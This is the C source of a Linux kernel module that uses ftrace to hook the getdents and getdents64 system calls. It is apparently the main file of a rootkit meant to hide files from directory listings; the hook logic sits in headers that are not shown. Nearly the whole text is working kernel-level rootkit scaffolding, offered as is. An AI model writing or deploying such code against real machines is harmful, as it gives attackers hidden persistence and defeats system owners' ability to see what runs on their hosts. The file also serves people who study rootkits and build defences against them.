#include "headers.h"
#include "ftrace.h"
#include "hooks/getdents.h"
#include "hooks/getdents64.h"


static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

static int __init lkm_init(void) {

    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "lkm: Good to go everything is working so far ... \n");

    return 0;
}

static void __exit lkm_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "lkm: BYE\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("d3dsec");